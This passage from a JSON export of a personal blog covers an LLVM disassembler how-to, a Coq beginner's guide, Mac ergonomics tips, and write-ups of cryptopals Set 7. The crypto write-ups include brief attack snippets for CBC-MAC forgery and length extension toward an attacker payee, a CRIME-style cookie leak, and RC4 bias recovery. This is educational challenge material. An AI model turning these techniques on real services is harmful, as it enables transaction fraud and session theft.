&quot;unknown&quot;. Some valid triples include x86_64-unknown-linux-gnu, i486--linux-gnu, etc. If you want to set Intel syntax, you need to use LLVMSetDisasmOptions(). If you set the correct flag, it will toggle one of three options: 123456/* The option to produce marked up assembly. */#define LLVMDisassembler_Option_UseMarkup 1/* The option to print immediates as hex. */#define LLVMDisassembler_Option_PrintImmHex 2/* The option use the other assembler printer variant */#define LLVMDisassembler_Option_AsmPrinterVariant 4 By default, the asm printer is AT&amp;T syntax, so we need to toggle option flag 4 for Intel: 1LLVMSetDisasmOptions(dcr, 4); Getting disassembly Finally, let’s disassemble our hex string. For this, we’ll use the LLVMDisasmInstruction function. 123size_t LLVMDisasmInstruction(LLVMDisasmContextRef DC, uint8_t *Bytes, uint64_t BytesSize, uint64_t PC, char *OutString, size_t OutStringSize); This function takes an input buffer of uint8_t, an output buffer of chars, proper lengths, and a program counter PC. Here’s a routine to convert a std::string to a uint8_t buffer. 12345678910int hex2bytes(std::string hex, unsigned char outBytes[])&#123; // An unsigned char is just an alias for uint8_t // Get raw chars from std::string const char* pos = hex.c_str(); for (int ct = 0; ct &lt; hex.length()/2; ct++)&#123; sscanf(pos, &quot;%2hhx&quot;, &amp;outBytes[ct]); pos += 2; &#125;&#125; Now, we’re all set to use LLVMDisasmInstruction! 123456789// targetAsm is a std::string of hex chars// the length of the resulting array of uint8_t&#x27;s is hex string length/2unsigned char* input = new unsigned char[targetAsm.length()/2];hex2bytes(targetAsm, input);//This is the output buffer for the human-readable instructionchar *outstring = new char[50];LLVMDisasmInstruction(dcr, input, targetAsm.length()/2, 0, outstring, 50);printf(&quot;%s&quot;, outstring);// Prints mov EBP, ESP To see more usages of the LLVM McDisassembly API, check out the LLVM Project Blog. References https://stackoverflow.com/questions/18267803/how-to-correctly-convert-a-hex-string-to-byte-array-in-c http://blog.llvm.org/2010/01/x86-disassembler.html","categories":[{"name":"Languages","slug":"Languages","permalink":"http://raywang.tech/categories/Languages/"}],"tags":[{"name":"Panda","slug":"Panda","permalink":"http://raywang.tech/tags/Panda/"},{"name":"LLVM","slug":"LLVM","permalink":"http://raywang.tech/tags/LLVM/"},{"name":"x86","slug":"x86","permalink":"http://raywang.tech/tags/x86/"}]},{"title":"Formal Reasoning in Coq — a Beginner's Guide","slug":"formal-reasoning-in-coq","date":"2017-09-25T17:12:00.000Z","updated":"2024-08-29T06:03:14.441Z","comments":true,"path":"2017/09/25/formal-reasoning-in-coq/","permalink":"http://raywang.tech/2017/09/25/formal-reasoning-in-coq/","excerpt":"I’m currently taking the Fall 2017 iteration of 6.826, Principles of Computer Systems. This class has been offered in various forms over the years, but this iteration is quite different. It focuses on formal verification of computer systems using Coq, a language for mechanical theorem proving. The goal of this class is to write the spec, implementation, and proofs for a formally verified RAID filesystem in Coq, then generate Haskell code from it.","text":"I’m currently taking the Fall 2017 iteration of 6.826, Principles of Computer Systems. This class has been offered in various forms over the years, but this iteration is quite different. It focuses on formal verification of computer systems using Coq, a language for mechanical theorem proving. The goal of this class is to write the spec, implementation, and proofs for a formally verified RAID filesystem in Coq, then generate Haskell code from it. I’ve been quite curious about the field of formal verification since I first learned about it last semester. I couldn’t fit Adam Chlipala’s FRAP (Formal Reasoning About Programs) into my schedule, but I didn’t want to miss out on Zeldovich and Kaashoek’s PoCS class because it seemed more practical in nature. This is the first in a series of posts on approaching Coq and formal verification as a complete beginner. Environment Setup I’d heard good things about using Emacs + Proof General for Coq, so I started using Spacemacs, which combines vim’s editing modes and keybindings with Emacs’. I haven’t tried the default CoqIDE or Coquille in vim, but Emacs’ Coq support is pretty great. With company-coq and spacemacs-coq layers, there’s not much more you could ask for. If you’re coming from vim, Spacemacs is a little obnoxious to get set up, though. The Coq integration is a Spacemacs ‘layer’, which is a set of configurations for a specific task. Make sure that the Coq layer activates upon opening a .v file. Perhaps I’ll do another post about all the editors I use daily — Vim, Sublime, Atom, and Spacemacs — (I’m a mongrel, I know), but for now, I’ll just direct you to some Spacemacs resources. Tactics, Datatypes, and Coq commands Software Foundations is the best place to start getting your feet wet. The first three chapters — Basics, Induction, and Lists — will give you all you need to start being productive. When you open a .v Coq file in Spacemacs, Coq mode should be activated. You should now be able to access company-coq commands with the Ctrl-C leader, and if you have spacemacs-coq, there’s some common commands under the , leader. Start the proof using proof-goto-point or an alias for it, and you’ll be able to see the goal you’re proving and the context, containing your variables and hypotheses, in a pane on the right. Note that the Coq process can only be active in one buffer at a time, so you can’t have proofs running simultaneously in several files. Once you’ve learned the basic syntax, you should also do the Emacs company-coq-tutorial to learn about all the IDE-like helpers that the layer provides. Coq objects Here are some of the most important constructs in Coq: Definition, Function, Fixpoint, and Inductive Inductive defines inductive types. Function and Fixpoint are for recursively defined functions on inductive types. Note that Fixpoints must be obviously decreasing on each recursive call, or else Coq will complain. Built-in datatypes such as Nat, List, Prop, Bool. Theorem, Lemma, Proof match statements ( familiar from any other functional language ) Getting started with tactics The first three chapters of SF will teach you a few basic tactics — namely, induction, assert, simpl, reflexivity, rewrite, apply, replace. Nearly all the the exercises can be completed with just these. Once you get sufficiently advanced, you’ll be able to identify when magic commands like auto or omega will just solve the rest of your proof for you. info_auto will show you the tactics that auto is using. You’ll start to notice patterns in how to apply tactics. For instance, If you see a recursive data structure, you should think about destruct and induction. Both are used to perform case analysis on a constructor of an inductively defined type; induction also generates an induction hypothesis, while destruct does not. Sometimes, unfold will break a monolithic function into useful pieces. Other times, it will give you a fix expression that is harder to parse. Try simpl instead.[2] This cheatsheet is invaluable for most of the tactics you’ll ever need. I also found this site useful for the few most basic tactics. When you first start out, it’s useful to be able to search for library lemmas, theorems, definitions, notation, etc. The Search ___ command will look for definitions and theorems. If you quote the search string like &quot;eqb&quot;, it will look for all theorems with that as a substring. Locate can look up constants or notation, like &quot;?=&quot;. To insert the outputs of the last command as a comment (so you can refer to it without having to rerun it), spacemacs-coq provides the key sequence , ;. Proving binary search trees (and pitfalls) In the first lab of 6.826, we have to prove properties of trees. We are given a tree, defined as follows: 12345678(* A `nattree` is a tree of natural numbers, where every internal node has an associated number and leaves are empty. There are two constructors, L (empty leaf) and I (internal node). I&#x27;s arguments are: left-subtree, number, right-subtree. *) Inductive nattree : Set := | L : nattree (* Leaf *) | I : nattree -&gt; nat -&gt; nattree -&gt; nattree. (* Internal nodes *) We have to define a binary search function and a function to test whether a tree is a BST, then write proofs about the correctness of our functions. We want to prove, among other things, that our BST tester does indeed enforce the sortedness of left and right subtrees, and that binsearch can indeed find every element in the tree. My first attempt was a disaster, ending with convoluted proofs that would have gotten progressively harder had I not stopped and asked for help. I’ll talk about some of the pitfalls I made, and then discuss how everything went smoother on the second try. Pitfall 1: The Bool and Prop worlds Coq has two worlds: computational (Type) and logical (Prop). Booleans exist in the computational world, and can be either true or false. Props, by distinction, are uppercased True or False. As this answer explains, Essentially, Coq has both because they are useful for different things: booleans correspond to facts that can be checked mechanically (i.e., with an algorithm), whereas propositions can express more concepts… If b : bool represents a statement, we can assert that this statement is true by saying b = true, which is of type Prop. Note that Props can be used in proofs, but not in functions. To relate the two, we need theorems that translate between Bool and Prop, as I quickly and painfully discovered. Take a look at my initial definition of binsearch on a nattree t. 1234567891011match t with | L =&gt; false | I l n r =&gt; match beq_nat x n with | true =&gt; true | false =&gt; match Nat.ltb x n with | true =&gt; binsearch x l | false =&gt; binsearch x r end end end end. This seems reasonable, right? However, the beq_nat (an alias for Nat.eqb) and Nat.ltb return Bools, not Props! So, when we want to use hypotheses like x &lt; n (a Prop) to prove (x &lt;? n) = true, it’s not immediate because they’re in two different worlds!&lt;span class=“hint–top hint–error hint–medium hint–rounded hint–bounce” aria-label=“&lt;?, btw, is the notation for ltb, which you could have looked up with Locate &quot;&lt;?&quot;.”&gt;[1] We need a lemma in Coq like 1Lemma ltb_lt n m : (n &lt;? m) = true &lt;-&gt; n &lt; m. This lemma says that the proposition n &lt; m is True iff the proposition (n &lt;? m) = true is True. To illustrate this more, how about proving the proposition that (x &lt;? n) = false given x &gt; n? First we have to do something ugly like 1rewrite &lt;- Bool.not_true_iff_false, Nat.ltb_lt. which changes the goal like: 12345678__________________(x &lt;? n) = false__________________(x &lt;? n) &lt;&gt; true__________________~ x &lt; n and only then will an automagic command like omega be able to solve it. Second attempt What’s a better way to define binsearch, then? The cleanest is 123456789Function binsearch (x:nat) (t:nattree) : bool :=match t with| L =&gt; false| I l n r =&gt; match x ?= n with | Eq =&gt; true | Lt =&gt; binsearch x l | Gt =&gt; binsearch x r end end. The ?= is Nat.compare, which returns a comparison type, defined below: 1234Inductive comparison : Set := | Eq : comparison | Lt : comparison | Gt : comparison. With this cleaner definition, we can now use the lab’s given destruct_compare tactic to split our proof into three cases: x &lt; n, x = n, x &gt; n. Pitfall 2: Non-recursive definitions Observe these two definitions of btree_sorted, which checks a tree is a valid BST. 1: 1234567891011Fixpoint isAscendingProp (t: list nat) : Prop := match t with | nil =&gt; True | cons h tl =&gt; match tl with | nil =&gt; True | _ =&gt; and (Nat.le h (hd 0 tl)) (isAscendingProp tl) end end.Function btree_sorted (t:nattree) : Prop := isAscendingProp (flatten t). 2: 12345Function btree_sorted (t:nattree) : Prop := match t with | L =&gt; True | I l n r =&gt; btree_le l n /\\ btree_ge r n /\\ btree_sorted l /\\ btree_sorted r end. 1 is flattening the tree via in-order traversal, then checking that each element in the list is ≤\\leq≤ the next element. Algorithmically, this is efficient and correct, but it would lead to more work when writing proofs, since I would need more lemmas about isAscendingProp that related non-adjacent elements. Writing recursive definitions as in 2 makes the proof much easier. As my TA said, you want the definition to match how you’re writing the proof. Aside: Using List lemmas In my final solution, all my functions were recursive except btree_in, for determining membership in a list. 12Function btree_in (x:nat) (t:nattree) : Prop := In x (flatten t). If you get comfortable with the List library, then this shouldn’t be a problem. The In function has some nice lemmas. I used this one a lot: 1Lemma in_app_or : forall (l m:list) (a:A), In a (l ++ m) -&gt; In a l \\/ In a m. to split up 1H0: In x (flatten t1 ++ n :: flatten t2) into 1H0 : In x (flatten t1) \\/ n = x \\/ In x (flatten t2) Identifying patterns I found myself repeating the same tactic patterns in my proofs. For example, when I have a series of /\\ like A /\\ B /\\ C in my hypotheses, I can split them up using destruct_pairs, allowing me to use each clause individually because I know each one must be true. If there’s a series of \\/ in a hypothesis, you need to use multiple destructs. For example, I often ended up having H0 : In x (flatten left_subtree) \\/ n = x \\/ In x (flatten right_subtree) in my context, and my goal was to prove one of those clauses. Well, I would use destruct to consider each case individually, showing that the other two non-goal clauses resulted in contradictions. Therefore, my own goal must be true. Conventions and sugar In Basics.v of SF, you’ll find best practices on organizing proofs. I like to use nested bullet points -, +, and *, in that order, to focus subgoals whenever I am doing cases, induction, or destruct. When I have an assert, I wrap the proof of the assert in &#123;&#125;. Hopefully, you learned some pointers to get you more productive in Coq! There’s not many clear, beginner-oriented resources out there, so all of this post was constructed with trial and a lot of error. Resources Spacemacs Cheatsheet Spacemacs for Vim users 1.&lt;?, btw, is the notation for ltb, which you could have looked up with Locate &quot;&lt;?&quot;. ↩2.simpl, like many other tactics, can be applied globally in context and goal with ___ in *, or to a specific hypothesis with ___ in H0. ↩","categories":[{"name":"Formal Methods","slug":"Formal-Methods","permalink":"http://raywang.tech/categories/Formal-Methods/"}],"tags":[{"name":"Coq","slug":"Coq","permalink":"http://raywang.tech/tags/Coq/"}]},{"title":"Matasano Crypto Challenges, Set 7","slug":"matasano-crypto-challenges-set-7","date":"2017-09-11T17:54:00.000Z","updated":"2024-08-29T06:03:14.441Z","comments":true,"path":"2017/09/11/matasano-crypto-challenges-set-7/","permalink":"http://raywang.tech/2017/09/11/matasano-crypto-challenges-set-7/","excerpt":"Into uncharted waters we venture… this set has some various problems about famous real-world vulnerabilities, and it was challenging. fortenforge and I worked together quite a bit to get through it.","text":"Into uncharted waters we venture… this set has some various problems about famous real-world vulnerabilities, and it was challenging. fortenforge and I worked together quite a bit to get through it. One important life pro tip: os.urandom() is BLOCKING in python. That means, even multiprocessing code will not have any speedup because of this function! Try this snippet off StackOverflow instead: bytearray(random.getrandbits(8) for _ in range(num_bytes)) Challenge 49 CBC-MAC Message Forgery This attack emphasizes two things: that CBC-MAC should use a constant IV, and that it is vulnerable to length extension. For the first part, the attacker controls the IV used by CBC-MAC. We want to construct a valid message of the form &quot;from=victim&amp;to=attacker&amp;amount=1000&quot;. First, the attacker generates a valid message and MAC from an account that he controls (say, an accomplice), like &quot;from=normal&amp;to=attacker&amp;amount=1000&quot;. Then, the attacker generates the correct IV to turn normal into victim, as follows: 12345678evil_msg = &quot;from=victim&amp;to=attacker&amp;amount=1000&quot;evil_padded = padPKCS7(evil_msg, 16)# We&#x27;re xoring the forged message and normal_msg to get the difference between the two, and then applying it to the ivforged_iv = xor(evil_msg[:16], normal_msg[:16], iv)forged_mac = CBC_MAC(key, forged_iv, evil_padded)assert forged_mac == mac This forged mac will now be verified by the API server. One thing that confused me is how the attacker would be able to know the private key to communicate with the server, allowing him to construct such a message. This makes sense when the challenge explains: [The API is] publicly exposed - the attacker can submit messages freely assuming he can forge the right MAC. The web client should allow the attacker to generate valid messages for accounts he controls. Assume the attacker is in a position to capture and inspect messages from the client to the API server. The important thing is that the attacker can generate MACs using the private key for accounts that he controls, but not for someone else’s account. In the second part of this challenge, the attacker uses length extension to append an evil string &quot;attacker:10000&quot; to a recipients list in a victim’s transaction. The attacker first generates a MAC for a valid message that names him as a recipient (say, a transaction from himself to himself). He then intercepts a normal message like &quot;from=victim&amp;tx_list=normaluser:1&quot;, and xors in his own message at the end, causing the resultant MAC to become his own MAC. 12345678910attacker_valid_msg = construct_message(&quot;hello&quot;, (&quot;attacker&quot;, 10000), (&quot;attacker&quot;, 10000))attacker_padded = padPKCS7(attacker_valid_msg, 16)attacker_mac = CBC_MAC(key, iv, attacker_padded)# XOR out normal_mac to reacquire an IV of 0, then XOR in the first block of the attacker&#x27;s msgevil_msg = padded + xor(normal_mac, attacker_padded[:16]) + attacker_padded[16:]print &quot;C-&gt;A-&gt;S: Sending Attacker Message + MAC&quot;r.sendline(evil_msg)r.sendline(attacker_mac) Challenge 50 Hashing with CBC-MAC This is a simple modification of the length extension of the last challenge. My evil javascript payload is an alert with a comment at the end. 12forge = &quot;alert(&#x27;Ayo, the Wu is back!&#x27;);//&quot;forge_padded = padPKCS7(forge, 16) and, to ensure I get the same hash as the challenge snippet, 296b8d7cb78a243dda4d0a61d33bbdd1, I need to extend the CBC-MAC of the JS payload with the challenge snippet. I can simply add a block in the middle to xor out the MAC of the payload, ensuring that the rest of the CBC-MAC is identical to the original. 1concat_forge = forge_padded + xor(mac, js_padded[:16]) + js_padded[16:] Challenge 51 Compression Ratio Side-Channel Attacks, Aka, CRIME This has got to be the ugliest code I’ve written in a while, because my initial approach was bad… In this challenge, we use the side channel of zlib compression to leak a session cookie in an HTTP request. Without knowing much about the internal DEFLATE algorithm of zlib, just realize that repeated strings compress better. So, the basic idea is to bruteforce the session id by seeing whether added characters minimize the compression — telling us that the added characters are a part of the session id. I attempt to minimize scores by adding pairs of characters, but that turned out to be unnecessary. I also utilized python’s multiprocessing library, which was also totally overkill. 12pool = mp.Pool(processes = 8)compression_lens = pool.map(compression_oracle_worker, base64_permutations) When we are using CTR as the compression cipher, it’s pretty simple, since there’s no padding involved. Correct guesses for more characters of the id will result in lower compression lengths. When using CBC, we have to be concerned with padding. Instead of simply minimizing the compressed length, I need to use another piece of information to determine when I’ve guessed the right characters — a padding oracle. I put in some uncompressible guess for the id and find the padding necessary to push the compressed length above a block boundary. Once I find the correct id characters, then the compressed length will be a block length (16 bytes) lower than the uncompressible guess, because I’ve compressed it below the block boundary. The set of characters !@#$%^&amp;*()-`~[]&#125;&#123; can be used as padding, because they are not base64 characters and will not appear in the session id. I had to do a few hacky things to get it all to work, though: I need to test two padding lengths for each guess, since my guesses are all possible pairs of base64 characters. And, python’s Pool.map doesn’t take multiple arguments, so I have to pass in a list of lists to my oracle worker. 12base64_perms = [[padding[:-1], final + &quot;&quot;.join(perm)] for perm in it.permutations(base64_chars, 2)]base64_perms += [[padding[:-2], final + &quot;&quot;.join(perm)] for perm in it.permutations(base64_chars, 2)] Challenge 52 Iterated Hash Function Multicollisions The next three challenges all involve attacks on the Merkle-Damgard hash construction. We encountered this previously with MD5 and SHA1, and we’ll be using a specifically weakened version in these challenges. The basic idea in this challenge is that, once we find an initial collision of an iterated hash function, we can generate a ton more by extending that initial collision. The relevant paper is Joux. The key figure is . We can see that we can construct colliding messages by selecting one of BiB_iBi​, Bi′B_i&#x27;Bi′​ for each iii, giving us a total of 2i2^i2i colliding messages. Each message has the same intermediate hash values, h0,h1...h_0, h_1...h0​,h1​.... Now that we have a cheap way to generate collisions (if we ever need more, we can double how many collisions we have with very little work), we can break a cascaded hash function that just concatenates a weak hash and a strong hash. In my code, my “weak” hash is a Blowfish cipher truncated to 2 bytes of output, and my “strong” hash is truncated to 3 bytes of output. We can simply search in our pool of weak hash collisions for a pair of messages that also collides in the strong hash. No luck? Then double the number of weak hash collisions (easy!) and keep looking… Challenge 53 Kelsey and Schneier’s Expandable Messages It took me a little bit to understand this attack. The best explanation is Schneier’s paper here.. The goal here is to break second preimage resistance — as the challenge states, finding x′x&#x27;x′ such that H(x′)=H(x)=yH(x&#x27;) = H(x) = yH(x′)=H(x)=y. Remember that, in the iterated hash function construction, if the internal hash state of two different messages are ever equal, then we can make sure that all following hash states, including the output, will be equal (by ensuring that the messages don’t differ after this point). So, if we have a very long message of 2R−12^R - 12R−1 blocks, we have 2R2^R2R intermediate hash states that we can potentially collide with, decreasing the difficulty of finding a second preimage. However, length padding screws this up. MD construction calls for the length of the message to be appended to the message before the final hash is output, which prevents the above attack. We are forced to find a colliding message of length 2R−12^R - 12R−1! Fortunately, we can bypass this defense with expandable messages that allow us to actually construct a message of this length very easily. We first find pairs of colliding messages, where each pair consists of a single-block message and a message of length 2k−1+12^{k-1} + 12k−1+1. Each pair’s initial hash state is the colliding hash of the previous pair. This is our expandable message. When we want to construct a message of length between kkk and k+2k−1k + 2^k - 1k+2k−1, we can create it by concatenating pieces of our expandable message (you might already be able to see how if you are familiar with binary search). For each block in our chain, we can either append the single-block message or the 2i−12^{i} - 12i−1 message, allowing us to build a message of any length that hashes to the same output as the others. The result will look something like this: So, all that remains to get our second preimage is to find a single “bridge” block that will allow our expandable message to hash to one of the intermediate states of the long message. Once we find this block, which collides with the nnnth intermediate hash state of the long message, we simply produce a message of length nnn in the manner shown above. 12345# Where prefix is generated from our expandable messageprefix = generate_prefix(intmed_state_hash_index)second_preimage = prefix + linking_blocksecond_preimage += target_long_msg[len(second_preimage):] Challenge 54 Kelsey and Kohno’s Nostradamus Attack This challenge deals with another kind of preimage resistance — we want to make a prediction about some event that hashes to some output HHH, and after the event has passed, create a correct “prediction” that also hashes to HHH, thus convincing people that we knew the results of the event beforehand. This attack is also known as the “herding” attack, and it’s easy to see why. The basic premise is to construct a “collision tree” by selecting a bunch of starting hash states, finding message blocks under which pairs of these states collide, and building up a binary tree to a root hash state. The paper calls this tree a “diamond structure”, and it’s very easy to produce. Once we have the collision tree, we can choose our prefix (the actual result of the event) and append some glue blocks so that the last one collides with one of the leaves in our tree. Then, as the challenge says “Follow the path from the leaf all the way up to the root node and build your suffix using the message blocks along the way.” Challenge 55 MD4 Collisions To be honest, this challenge makes everything else look like chump stuff. fortenforge and I worked on this together for several days, and when I got tired of it, he soldiered on, ending up with a beautiful MD4 collision. I’ll refer you to his writeup in lieu of explaining it myself, and he deserves all the credit for this excellent piece of work. Challenge 56 RC4 Single Byte biases This seems like a pretty silly challenge, and I couldn’t get it to work. We basically trust this paper that says that the RC4 encryption function is biased towards certain bytes at certain byte positions — byte 0, 16, 32, etc. For instance, the RC4 ciphertext’s 16th byte is biased towards 0xF0. To quote the paper, Suppose byte ZrZ_rZr​ of the RC4 keystream has a dominant bias towards value 0x00. As RC4 encryption is defined as Cr=Pr⊕ZrC_r = P_r ⊕ Z_rCr​=Pr​⊕Zr​, the corresponding ciphertext byte CrC_rCr​ has a bias towards plaintext byte PrP_rPr​. Thus, obtaining sufficiently many ciphertext samples CrC_rCr​ for a fixed plaintext PrP_rPr​ allows inference of PrP_rPr​ by a majority vote: PrP_rPr​ is equal to the value of CrC_rCr​ that occurs most often. Unfortunately, you need to RC4 encrypt a ton of messages under random keys for this to work, which takes a lot of time, and the results were not at all good for me, even with 2242^{24}224 encryptions for each byte. 12345678910111213def attack_byte(idx): chars = &#123;char: 0 for char in range(256)&#125; padding = &#x27;A&#x27;*(15 - idx) for i in range(2**20): if i % (10**6) == 0: print(&quot;Iteration: &quot;, i) ctext = rc4_oracle(padding) guess = ctext[15] ^ 0xf0 chars[guess]+= 1 max_char = max(chars.items(), key = op.itemgetter(1))","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"Protips for Speed (And Reducing RSI) for Programmers or Mac Users","slug":"Protips-for-speed-and-reducing-RSI-for-programmers-or-Mac-users","date":"2017-08-14T02:23:45.000Z","updated":"2024-08-29T06:03:14.440Z","comments":true,"path":"2017/08/13/Protips-for-speed-and-reducing-RSI-for-programmers-or-Mac-users/","permalink":"http://raywang.tech/2017/08/13/Protips-for-speed-and-reducing-RSI-for-programmers-or-Mac-users/","excerpt":"I’ve been wanting to write this post for a while — here I’ll describe all the excellent customizations that I’ve accrued over several years of optimizing my Mac for speed and alleviating repetitive stress injury (RSI). If you’re a Mac power user, or if you make a living at a keyboard, you want to read this.","text":"I’ve been wanting to write this post for a while — here I’ll describe all the excellent customizations that I’ve accrued over several years of optimizing my Mac for speed and alleviating repetitive stress injury (RSI). If you’re a Mac power user, or if you make a living at a keyboard, you want to read this. Preventing or reducing RSI If you’ve never experienced RSI, I’m jealous. Programming for just a few years has given me mild to excruciating amounts of wrist pain, finger pain, and elbow pain, and I’m still just a student! The small investment in an ergonomic setup could save you a lot of trouble later. Here are some things that help: Gel wrist rest My first ergonomic venture was a 3M gel wrist rest off of Amazon. It’s lasted two years so far and has been great to keep the sharp edge of my Macbook from digging into my wrists. It also elevates your hands above the keyboard so that typing is more comfortable. I’m now inseparable from my wrist rest, and it’s also gotten me some extra screening from airport security… Compression gloves If you have finger joint soreness, compression gloves are a must. I’ve tried many different pairs (comparing price and compression level), and I think IMAK has pretty good ones. They’re quite delicate and can tear after extended use, but they provide much better compression and fit than cheaper, thicker gloves. Even if you don’t have any pain, I recommend getting a pair. They make typing much more pleasurable, especially in cold weather. Ergonomic mouse and trackpad I also tried a few ergo mice before settling on the J-Tech mouse. It has both Bluetooth and wired versions, and it works great on a Mac. You can see in the photo the wonderful detachable platform on which you rest the bottom of your palm, keeping it off the table. There’s also two thumb-side buttons that you can customize, as I’ll mention later. Much less finger pain than using a trackpad or a conventional mouse. Get a trackpad with a wrist rest (either foam or gel, your pick), while you’re at it. Standing desk A full standing desk is definitely too pricey, but there are cheaper solutions out there. One that serves its purpose for only $35 is this guy. It’s good to alternate standing and sitting, and this portable one is light as air and easy to set aside, but still sturdy. Adjusting it is a pain, though. Ergonomic keyboards I’ve recently started using the Microsoft Natural 4000 at work, and it puts less strain on the fingers than the default Mac keyboard. The built-in wrist rest and sloping contours are comfortable, though it’s quite a large keyboard and my small hands stretch to reach some keys. For the power user, justaperson will testify that the Ergodox-EZ, at $300, is not cheap, but certainly worth it. It comes in two pieces so that you can arrange your hands at shoulder width, which is the optimal position for ergonomics. There’s software to program the keys however you want, and you can get versions with or without printed keycaps. And if you’re a fan of mechanical keys, you can choose your preferred type. Note that it takes some getting used to, as justaperson can tell you, but he now uses it all the time. Mac Customizations My Mac environment has layers of speedups, shortcuts, and tricks, some of which are so superb that I don’t know how anyone works without them. Here goes: BetterTouchTool I’ve been using BetterTouchTool for years, and it’s absolutely incredible. The sheer number of features that now exist, including its mouse, trackpad, touchbar, keyboard integrations, allow any shortcut imaginable. When people ask me, “how the hell are you doing _______ on your Mac??”, my answer is probably BetterTouchTool! Here are my best customizations that Mac users will salivate over: Window resizing by holding option and dragging mouse anywhere in the window Window moving by holding ⌘ and dragging mouse anywhere in the window ⌘+E opens the amazing BetterTouchTool Window Switcher. Miles better than ⌘+Tab Opt+Ctrl+T to open a Finder window from anywhere I’ve mapped a ton of Opt+letter or arrow keys to snap a window to a corner, half, or third of the screen. Now that I use the J-Tech mouse, I’ve mapped the two extra buttons to the Window Switcher as well. MAGIC!! The best part is that it’s pay-what-you-want (with a measly minimum of $6), while its functionality feels like it’s worth as much as the Mac itself. Karabiner This nifty, free keyboard customizer can do key modifications ranging from simple to mind-boggling, per-keyboard profiles, and more. I don’t have many shortcuts, but I appreciate being able to map Return to Ctrl, so I put less strain on my left pinky, which often occurs when using tmux, vim or emacs (look up emacs pinky!). If I press Return alone, it enters a line break, but if I hold it and press another key, I get Ctrl functionality. Neat! I also sometimes remap Microsoft keyboards to make the left-corner keys more like a Mac’s Ctrl, Option, and ⌘. For MacOS Sierra, you’ll need Karabiner-Elements, a beta version which provides much the same functionality. Copy’Em Paste STOP SWITCHING WINDOWS TO PASTE MULTIPLE THINGS! Everyone needs a good clipboard manager, no matter what platform you’re on. Copy’Em Paste is everything you’ll ever need from one. I love that it has a customizable hotkey, favorites, search, image clipping, and option to paste richtext or plaintext. It’s well worth the $15 price tag, though I won’t say where I got mine… Multiple Desktops Many Mac users may already know about Multiple Desktops, but here’s a nice hack: Each desktop is associated with a specific task, and you can use Ctrl+number hotkeys to quickly switch to what you need. For instance, you can put music in Desktop 8, a terminal in Desktop 7, email in Desktop 9, and navigating to each becomes muscle memory. I learned this trick from firescar a few years ago. He was doing this on Linux, and I discovered that Multiple Desktops give the same effect on Macs. iTerm2 iTerm is strictly better than Mac’s built-in Terminal. If you don’t have it, make the switch right now. Its endless customizations and even a black-magic tmux integration mode are a boon for programmers who use their terminal more than their browsers. I also switched from bash to zsh for the awesome plugins that make the terminal 1000x better. Here’s the best zsh plugins I use: fasd — Never cd to a full pathname again! This plugin remembers your previous working directories, so you can simply type part of a directory name and it will automatically go to the most recent/most used folder that matches fuzzy search osx — Simple shortcuts like ofd to open the present working directory in a Finder window. Pretty cool, right? history-substring-search — Instead of Ctrl+R for a shitty back-search, simply type a partial command and press the Up arrow to get a fuzzy search to recent matches. Running previous commands has never been easier… git — Dozens of aliases for git. Enough said. You’re welcome! var options = { rowHeight: 140, margins: 4, lastRow: 'justify' }; $('.justified-gallery').justifiedGallery(options);","categories":[{"name":"Meta","slug":"Meta","permalink":"http://raywang.tech/categories/Meta/"}],"tags":[{"name":"Ergonomics","slug":"Ergonomics","permalink":"http://raywang.tech/tags/Ergonomics/"}]},{"title":"Looking Towards Summer: Concolic Execution, Fuzzy Panda, and More","slug":"2017/Looking towards Summer: Concolic Execution, Fuzzy Panda, and more","date":"2017-05-23T09:55:00.000Z","updated":"2024-08-29T06:03:14.438Z","comments":true,"path":"2017/05/23/2017/Looking towards Summer: Concolic Execution, Fuzzy Panda, and more/","permalink":"http://raywang.tech/2017/05/23/2017/Looking%20towards%20Summer:%20Concolic%20Execution,%20Fuzzy%20Panda,%20and%20more/","excerpt":"It’s always bothered me that MIT or MIT Lincoln Lab didn’t submit anything to DARPA’s Cyber Grand Challenge. With all the smart people, such as my advisor, Armando Solar-Lezama, working on program analysis and formal methods (which I currently know nothing about), I would have expected that we could create a strong Cyber Reasoning System worthy of CGC. That’s sort of what I will be working on this summer at Lincoln and probably writing my thesis on. But I’m very new to the field and have just started diving in.","text":"It’s always bothered me that MIT or MIT Lincoln Lab didn’t submit anything to DARPA’s Cyber Grand Challenge. With all the smart people, such as my advisor, Armando Solar-Lezama, working on program analysis and formal methods (which I currently know nothing about), I would have expected that we could create a strong Cyber Reasoning System worthy of CGC. That’s sort of what I will be working on this summer at Lincoln and probably writing my thesis on. But I’m very new to the field and have just started diving in. I will primarily be engineering on panda, LL’s dynamic analysis platform. I will first need to implement record-replay for PowerPC, because that’s what a lot of embedded devices are still programmed in. More on this later… Anyways, I’ve decided that I’m going to take 6.035 again in Fall, but this time in Haskell. The fall version will have a language much simpler semantics but is going to be very optimization-heavy. I’d like to get the experience in functional programming, as well as implement the optimizations that I didn’t get to this semester. I still want to get better at Rust, though, so I will continue working on this Spring’s version of 035, the MITScript dynamic language. I would like to get the code generator fully working and integrate a generational GC. Thank goodness I have JustAPerson around to help me debug Rust. For the sake of learning Haskell and LLVM, I’ll try to follow the Kaleidoscope tutorial. JustAPerson seems to think I won’t be able to handle 6.035 in Haskell unless I spend the whole summer practicing. Fortenforge and I will also be finishing the Matasano Crypto Challenges and working on a packet analysis framework for Lab RATs to use at DEF CON this summer. Many things to do!","categories":[{"name":"Meta","slug":"Meta","permalink":"http://raywang.tech/categories/Meta/"},{"name":"Research","slug":"Meta/Research","permalink":"http://raywang.tech/categories/Meta/Research/"}],"tags":[{"name":"Panda","slug":"Panda","permalink":"http://raywang.tech/tags/Panda/"},{"name":"Symbolic Execution","slug":"Symbolic-Execution","permalink":"http://raywang.tech/tags/Symbolic-Execution/"},{"name":"Program Analysis","slug":"Program-Analysis","permalink":"http://raywang.tech/tags/Program-Analysis/"}]},{"title":"Matasano Crypto Challenges, Set 6","slug":"2017/Matasano Crypto Challenges, Set 6","date":"2017-05-21T16:40:00.000Z","updated":"2024-08-29T06:03:14.438Z","comments":true,"path":"2017/05/21/2017/Matasano Crypto Challenges, Set 6/","permalink":"http://raywang.tech/2017/05/21/2017/Matasano%20Crypto%20Challenges,%20Set%206/","excerpt":"The last of the original crypto challenges… here we go! Challenge 41 Implement unpadded message recovery oracle Unpadded RSA is homomorphic, meaning that, if operations like multiplication and addition are carried out on ciphertext, it is as if the same operation were applied to the plaintext.","text":"The last of the original 